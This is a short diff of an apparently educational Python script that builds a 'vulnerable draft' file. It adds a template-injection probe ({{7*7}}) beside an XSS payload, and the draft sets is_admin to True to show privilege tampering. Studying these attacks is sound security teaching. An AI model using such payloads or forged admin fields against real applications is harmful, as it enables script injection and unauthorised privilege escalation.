@@ -5,7 +5,7 @@ def make_vulnerable_draft(path='evil.draft'):
     # Любые поля можно добавить или подменить
     draft = {
         "title": "Hacked Post",
-        "content": "<script>alert('pwned!')</script>",
+        "content": "<script>alert('pwned!')</script>{{7*7}}",
         # Студент может добавить свои поля — например, is_admin
         "is_admin": True
     }
